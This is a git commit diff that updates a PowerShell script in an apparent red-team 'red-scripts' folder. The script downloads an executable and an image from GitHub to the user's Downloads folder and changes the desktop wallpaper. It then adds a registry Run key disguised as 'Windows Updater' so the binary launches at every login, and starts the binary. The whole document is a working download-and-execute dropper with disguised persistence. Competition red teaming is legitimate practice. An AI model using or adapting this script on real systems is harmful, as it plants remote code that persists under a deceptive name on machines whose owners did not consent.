dc68716cbee3715c82431b017da4bc0e58a11a8b
lfgberg <lfgaberg@gmail.com>
2024-02-29 21:22:34 -0500

    update gumperinstaller

--- red-scripts/download_install_gumper.ps1
+++ red-scripts/download_install_gumper.ps1
@@ -1,16 +1,25 @@
-$exeUrl = "https://github.com/" # CHANGE ME
+# Exe and Background
+$exeUrl = "https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/GumpBit.exe"
+$bgUrl = "https://raw.githubusercontent.com/lfgberg/GumpBit/main/GumpBit.png"
 
-$destPath = "C:\Windows\Tasks\gumpbit.exe"
+# Define the destination paths in the user's Downloads folder
+$exePath = "$env:USERPROFILE\Downloads\GumpBit.exe"
+$bgPath = "$env:USERPROFILE\Downloads\GumpBit.png"
 
+# Use WebClient to download the files
 $webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($exeUrl, $destPath)
+$webClient.DownloadFile($exeUrl, $exePath)
+$webClient.DownloadFile($bgUrl, $bgPath)
 
-$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$exeName = "Ballsack" # Name the entry
-$command = $destPath # Command to run the EXE
-
-Set-ItemProperty -Path $registryPath -Name $exeName -Value $command
-
+# Cleanup WebClient
 $webClient.Dispose()
 
-Start-Process $destPath
+# Set the registry keys to run the exe and change the bg
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $bgPath
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Updater' -Value $exePath
+
+# Update the background
+Start-Process RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+# Run the binary
+Start-Process $exePath
